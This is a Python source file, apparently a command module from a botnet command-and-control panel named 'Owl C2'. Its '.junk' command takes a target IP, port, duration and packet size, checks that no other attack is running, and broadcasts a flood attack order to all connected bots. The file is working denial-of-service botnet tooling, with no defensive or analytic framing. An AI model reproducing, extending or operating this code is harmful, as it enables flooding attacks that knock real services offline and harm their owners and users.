import src.Commands.slot_handler as slot_handler

def junk(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data):
    from src.cnc import gradientText

    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    if validate_size(size):
                        slotvar = slot_handler.is_attack_running()
                        if slotvar[0]:
                            send(client, gradientText(f'\nAttack already running {slotvar[1]:.2f} seconds remaining\n',(255,0,0), (255,100,100)))
                            return
                        send(client, gradientText(f"\nAttack successfully sent to all Owl C2 Servers!\n", (147, 103, 176), (189, 174, 199)))
                        broadcast(data)
                        slot_handler.set_attack(int(secs))
                    else:
                        send(client, gradientText('\nInvalid packet size (1-65500 bytes)\n', (255,0,0), (255,100,100)))
                else:
                    send(client, gradientText('\nInvalid attack duration (10-1300 seconds)\n', (255,0,0), (255,100,100)))
            else:
                send(client, gradientText('\nInvalid port number (1-65535)\n', (255,0,0), (255,100,100)))
        else:
            send(client, gradientText('\nInvalid IP-address\n', (255,0,0), (255,100,100)))
    else:
        send(client, gradientText('\nUsage: .junk [IP] [PORT] [TIME] [SIZE]\n', (147, 103, 176), (189, 174, 199)))